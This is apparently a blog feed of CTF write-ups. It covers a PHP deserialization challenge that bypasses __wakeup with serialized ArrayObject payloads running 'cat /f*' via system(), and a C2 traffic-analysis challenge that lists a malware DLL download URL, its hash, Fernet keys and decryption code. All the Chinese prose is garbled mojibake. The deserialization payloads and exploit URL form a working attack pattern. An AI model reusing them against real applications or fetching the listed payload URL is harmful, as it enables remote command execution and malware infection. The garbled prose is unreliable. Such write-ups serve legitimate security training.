</span><br><span class="line">__wakeup() ä½¿ç”¨unserialize()æ—¶è‡ªåŠ¨è§¦å‘</span><br><span class="line">__destruct() å½“ä¸€ä¸ªå¯¹è±¡è¢«é”€æ¯æ—¶è§¦å‘</span><br><span class="line">__toString() å½“ä¸€ä¸ªç±»è¢«å½“æˆå­—ç¬¦ä¸²ä½¿ç”¨æ—¶è§¦å‘</span><br><span class="line">__invoke() å½“å°è¯•ä»¥è°ƒç”¨å‡½æ•°çš„æ–¹å¼è°ƒç”¨ä¸€ä¸ªå¯¹è±¡æ—¶è§¦å‘</span><br><span class="line">__call() åœ¨å¯¹è±¡ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶è§¦å‘ </span><br><span class="line">__callStatic() åœ¨é™æ€ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶è§¦å‘ </span><br><span class="line">__get() ç”¨äºä»ä¸å¯è®¿é—®çš„å±æ€§è¯»å–æ•°æ®</span><br><span class="line">__set() ç”¨äºå°†æ•°æ®å†™å…¥ä¸å¯è®¿é—®çš„å±æ€§</span><br><span class="line">__isset() åœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šè°ƒç”¨<span class="keyword">isset</span>()æˆ–<span class="keyword">empty</span>()è§¦å‘</span><br><span class="line">__unset() åœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šä½¿ç”¨<span class="keyword">unset</span>()æ—¶è§¦å‘</span><br></pre></td></tr></table></figure><p>__wakeup() ä½¿ç”¨unserialize()æ—¶è‡ªåŠ¨è§¦å‘ ï¼Œä»£ç ä¸­ä½¿ç”¨äº† unserializeå‡½æ•°ï¼Œé‚£å°±ä¼šé”€æ¯</p><p>åœ¨php5ä¸­ç»•è¿‡__wakeup()å°†å¯¹è±¡å±æ€§çš„ä¸ªæ•°å€¼å¤§äºçœŸå®çš„å±æ€§å°±ä¼šè·³è¿‡__wakeup()</p><p>php7ç¯å¢ƒä¸‹ï¼Œéœ€è¦åºåˆ—åŒ–ArrObjectç±»æ¥ç»•è¿‡</p><figure class="highlight nim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">php5ç¯å¢ƒä¸‹ï¼Œåªéœ€è¦åœ¨æ­£å¸¸ç”Ÿæˆçš„åºåˆ—åŒ–å­—ç¬¦ä¸²æ•°å­—å‰æ·»åŠ ä¸€ä¸ª+å·å³å¯ç»•è¿‡æ‰§è¡Œ</span><br><span class="line">æ–¹æ³•:</span><br><span class="line">echo serialize(new ctfshow())</span><br><span class="line">payload: </span><br><span class="line">O:+<span class="number">7</span>:<span class="string">&quot;ctfshow&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">7</span>:<span class="string">&quot;ctfshow&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;cat /f*&quot;</span>;&#125;</span><br><span class="line">php7ç¯å¢ƒä¸‹ï¼Œéœ€è¦åºåˆ—åŒ–<span class="type">ArrObject</span>ç±»æ¥ç»•è¿‡</span><br><span class="line">æ–¹æ³•:</span><br><span class="line">echo serialize(new <span class="type">ArrayObject</span>(new ctfshow()));</span><br><span class="line">payload:</span><br><span class="line">C:<span class="number">11</span>:<span class="string">&quot;ArrayObject&quot;</span>:<span class="number">61</span>:&#123;x:i:<span class="number">0</span>;O:<span class="number">7</span>:<span class="string">&quot;ctfshow&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">7</span>:<span class="string">&quot;ctfshow&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;cat /f*&quot;</span>;&#125;;m:a:<span class="number">0</span>:&#123;&#125;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ­¤é¢˜ä¸­ä¸ºphp7</p><p>payload  è‡ªå·±åŠ ä¸€ä¸ªpublicå˜é‡å³å¯</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshow</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ctfshow</span>=<span class="string">&#x27;cat /f*&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;not allowed!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        system(<span class="keyword">$this</span>-&gt;ctfshow);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$data</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;1+1&gt;2&#x27;</span>];</span><br><span class="line"><span class="keyword">print</span>(<span class="variable">$data</span>);</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="keyword">new</span> <span class="built_in">ArrayObject</span>(<span class="keyword">new</span> ctfshow()));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//C:11:&quot;ArrayObject&quot;:61:&#123;x:i:0;O:7:&quot;ctfshow&quot;:1:&#123;s:7:&quot;ctfshow&quot;;s:7:&quot;cat /f*&quot;;&#125;;m:a:0:&#123;&#125;&#125;</span></span><br></pre></td></tr></table></figure><p><code>http://bd6bbd85-fa6e-4a78-ab40-c83485c956ed.challenge.ctf.show/?1%2b1&gt;2=C:11:&quot;ArrayObject&quot;:61:&#123;x:i:0;O:7:&quot;ctfshow&quot;:1:&#123;s:7:&quot;ctfshow&quot;;s:7:&quot;cat /f*&quot;;&#125;;m:a:0:&#123;&#125;&#125;</code></p><p><img src="/images/2023ctfshow%E6%84%9A%E4%BA%BA%E6%9D%AF/image-20230406223747040.png" alt="image-20230406223747040"></p><h4 id="æœ€å"><a href="#æœ€å" class="headerlink" title="æœ€å"></a>æœ€å</h4><blockquote><p>ä¸€ç›´åœ¨è·¯ä¸Š</p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2023æ•°å­—ä¸­å›½åˆ›æ–°å¤§èµ›-ç½‘ç»œæ•°æ®å®‰å…¨èµ›é“-æ•°æ®å®‰å…¨äº§ä¸šäººæ‰èƒ½åŠ›æŒ‘æˆ˜èµ›-é¢„èµ›wp</title>
      <link href="/2023/04/01/2023%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E8%B5%9B-%E7%BD%91%E7%BB%9C%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E8%B5%9B%E9%81%93-%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E4%BA%A7%E4%B8%9A%E4%BA%BA%E6%89%8D%E8%83%BD%E5%8A%9B%E6%8C%91%E6%88%98%E8%B5%9B-%E9%A2%84%E8%B5%9Bwp/"/>
      <url>/2023/04/01/2023%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E8%B5%9B-%E7%BD%91%E7%BB%9C%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E8%B5%9B%E9%81%93-%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E4%BA%A7%E4%B8%9A%E4%BA%BA%E6%89%8D%E8%83%BD%E5%8A%9B%E6%8C%91%E6%88%98%E8%B5%9B-%E9%A2%84%E8%B5%9Bwp/</url>
      
        <content type="html"><![CDATA[<p><img src="/images/others/image-20230406143344755.png" alt="image-20230406143344755"></p><p><strong>C2æµé‡åˆ†æ.1</strong></p><p>EDRåœ¨ä¸€å°æœºå¯†è®¡ç®—æœºä¸Šæ£€æµ‹åˆ°ç»ˆæ­¢k4.exeè¿›ç¨‹çš„è¡Œä¸ºï¼Œå–è¯äººå‘˜å–å‡ºæ¥äº†è¯¥æœºå™¨çš„é•œåƒæµé‡ï¼Œè¯·åˆ†æé™„ä»¶æµé‡ï¼Œå›ç­”å¯¹åº”é—®é¢˜ã€‚ï¼ˆæ³¨æ„ï¼šé¢˜ç›®ä¸­çš„ç¨‹åºå¯èƒ½å­˜åœ¨æ¶æ„æ“ä½œï¼Œå¦‚æœéœ€è¦è¿è¡Œæˆ–è°ƒè¯•ï¼Œè¯·åœ¨è™šæ‹Ÿæœºä¸­æ“ä½œï¼‰</p><p><a href="https://pan.baidu.com/s/1ldNxI6mMfduIxjtAOSMcZQ">https://pan.baidu.com/s/1ldNxI6mMfduIxjtAOSMcZQ</a></p><p><a href="https://pan.baidu.com/s/1ldNxI6mMfduIxjtAOSMcZQ">é™„ä»¶ä¸‹è½½</a> æå–ç ï¼ˆGAMEï¼‰<a href="https://share.weiyun.com/QbZIcyjq">å¤‡ç”¨ä¸‹è½½</a></p><p>è¯·æäº¤Payloadçš„å®Œæ•´ä¸‹è½½åœ°å€ã€‚ï¼ˆç­”æ¡ˆç¤ºä¾‹ï¼š<a href="http://xxx.xxx.xxx/xxx%EF%BC%89">http://xxx.xxx.xxx/xxxï¼‰</a></p><p><code>http://imgcache.cloudservicesdevc.tk/picturess/2023/RDSv38.dll</code></p><p><strong>C2æµé‡åˆ†æ.2</strong></p><p>è¯·æäº¤Payloadçš„SHA256å“ˆå¸Œå€¼ã€‚ï¼ˆå­—æ¯å¤§å†™ï¼Œè¯·æ ¹æ®æµé‡å†…å®¹ä½œç­”ï¼‰</p><p>å³é”®å°†è¿™ä¸ªRDSv38.dllæ–‡ä»¶å¯¼å‡ºç„¶åsha256å³å¯</p><p>AA2CBD3103CECAF189F93D787C602679E156CC6FD90E22646D637F01C64222CF</p><p><img src="/images/others/image-20230401164658387.png" alt="image-20230401164658387"></p><p>n6IcHjmQUNOd6TxOkV6WRigEPUZFkO2TIu8cS6MRyrE=</p><p>Aj0S2EgsjOFd_JRsOjcBB_5-fZ1H-9tZVF67-qOWCbw=</p><p>Aj0S2EgsjOFd_JRsOjcBB_5-fZ1H-9tZVF67-qOWCbw=</p><p>Z-Ur0AYZQ9-nNO_O6j5B1slASR-YR2tsssycqHNc_so=</p><p>eBp92fUD7Lk_6qXR2pIjFt3sBH-lW0ul830S-sO6QCQ=</p><p>Erj5UoZfpxT47Bjpg8qg1XmMCKZyKBj1bJ0otszVZPk=</p><p>qkwNBcGK7ZcOrlKKcflivlyiatdAsb2u_sH_-IB5R_Y=</p><p>0smJ2LvvnQonNICFpjOF8CeuOcMIuYLNVbCDucWSVaw=</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">PS D:\vscodework&gt; python3 -u &quot;d:\vscodework\ctf\other\shujusai.py&quot;</span><br><span class="line">è§£å¯†åä¿¡æ¯ï¼š I&#x27;m a hacker.</span><br><span class="line">PS D:\vscodework&gt; python3 -u &quot;d:\vscodework\ctf\other\shujusai.py&quot;</span><br><span class="line">è§£å¯†åä¿¡æ¯ï¼š This system has been hacked by me</span><br><span class="line">PS D:\vscodework&gt; python3 -u &quot;d:\vscodework\ctf\other\shujusai.py&quot;</span><br><span class="line">è§£å¯†åä¿¡æ¯ï¼š Next, I want to obtain some data</span><br><span class="line">PS D:\vscodework&gt; python3 -u &quot;d:\vscodework\ctf\other\shujusai.py&quot;</span><br><span class="line">åŠ å¯†å‰ä¿¡æ¯ï¼š test message</span><br><span class="line">PS D:\vscodework&gt; python3 -u &quot;d:\vscodework\ctf\other\shujusai.py&quot;</span><br><span class="line">åŠ å¯†å‰ä¿¡æ¯ï¼š test message</span><br><span class="line">PS D:\vscodework&gt; python3 -u &quot;d:\vscodework\ctf\other\shujusai.py&quot;</span><br><span class="line">åŠ å¯†å‰ä¿¡æ¯ï¼š test message</span><br><span class="line">PS D:\vscodework&gt; python3 -u &quot;d:\vscodework\ctf\other\shujusai.py&quot;</span><br><span class="line">åŠ å¯†å‰ä¿¡æ¯ï¼š test message</span><br><span class="line">è§£å¯†åä¿¡æ¯ï¼š å¥³,å°ç¾,<span class="number">500112202304217984</span>,<span class="number">12222222222</span>,<span class="number">111111111111</span>,<span class="number">22222</span>,<span class="number">333333</span></span><br><span class="line">PS D:\vscodework&gt; python3 -u &quot;d:\vscodework\ctf\other\shujusai.py&quot;</span><br><span class="line">åŠ å¯†å‰ä¿¡æ¯ï¼š test message</span><br><span class="line">è§£å¯†åä¿¡æ¯ï¼š e4 b8 <span class="number">80</span> e4 b8 aa <span class="number">74</span> <span class="number">78</span> <span class="number">74</span> <span class="number">0</span>a e5 <span class="number">95</span> <span class="number">86</span> e4 b8 <span class="number">9</span>a e8 ae a1 e5 <span class="number">88</span> <span class="number">92</span> ef bc <span class="number">88</span> e4 bb <span class="number">85</span> e4 be <span class="number">9</span>b e5 <span class="number">86</span> <span class="number">85</span> e9 <span class="number">83</span> a8 ef bc <span class="number">89</span> e6 ad a4 e5 a4 </span><br><span class="line"><span class="number">84</span> e7 <span class="number">9</span>c <span class="number">81</span> e7 <span class="number">95</span> a5 <span class="number">35</span> <span class="number">77</span> e5 ad <span class="number">97</span> <span class="number">0</span>a</span><br><span class="line">PS D:\vscodework&gt; python3 -u &quot;d:\vscodework\ctf\other\shujusai.py&quot;</span><br><span class="line">åŠ å¯†å‰ä¿¡æ¯ï¼š test message</span><br><span class="line">è§£å¯†åä¿¡æ¯ï¼š bye??</span><br><span class="line">PS D:\vscodework&gt; python3 -u &quot;d:\vscodework\ctf\other\shujusai.py&quot;</span><br><span class="line">åŠ å¯†å‰ä¿¡æ¯ï¼š test message</span><br><span class="line">è§£å¯†åä¿¡æ¯ï¼š no!I finally want to transmit a flag</span><br><span class="line">PS D:\vscodework&gt; python3 -u &quot;d:\vscodework\ctf\other\shujusai.py&quot;</span><br><span class="line">åŠ å¯†å‰ä¿¡æ¯ï¼š test message</span><br></pre></td></tr></table></figure><p>fernet è§£å¯†ï¼Œä¸€ç›´è§£å°±è¡Œè§£å‡ºæ¥æ˜¯ä¸€ä¸ªå›¾ç‰‡</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> cryptography.fernet <span class="keyword">import</span> Fernet</span><br><span class="line"></span><br><span class="line"><span class="comment"># key = Fernet.generate_key()  # ç”Ÿæˆå¯†é’¥</span></span><br><span class="line"><span class="comment"># print(key)</span></span><br><span class="line">key = <span class="string">&quot;0smJ2LvvnQonNICFpjOF8CeuOcMIuYLNVbCDucWSVaw=&quot;</span></span><br><span class="line">f = Fernet(key)  <span class="comment"># ä½¿ç”¨å¯†é’¥å®ä¾‹åŒ–</span></span><br><span class="line"></span><br><span class="line">message = <span class="string">&quot;test message&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;åŠ å¯†å‰ä¿¡æ¯ï¼š&#x27;</span>, message)</span><br><span class="line"></span><br><span class="line"><span class="comment"># token = f.encrypt(message.encode())</span></span><br><span class="line"><span class="comment"># print(&#x27;åŠ å¯†åä¿¡æ¯ï¼š&#x27;, token.decode())</span></span><br><span class="line">token = <span class="string">b&#x27;gAAAAABkGeI2QDhD2PlVFV2USJsTO2RxaUESQowz02khRfYI05-AiIFlDuP4HtLShGmGAXgKZ-sS5CXKfWv32mXJFUy7fItWPg==&#x27;</span></span><br><span class="line"></span><br><span class="line">decrypt_message = f.decrypt(token).decode()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;è§£å¯†åä¿¡æ¯ï¼š&#x27;</span>, decrypt_message)</span><br></pre></td></tr></table></figure><p><img src="/images/others/image-20230401171310298.png" alt="image-20230401171310298"></p><p>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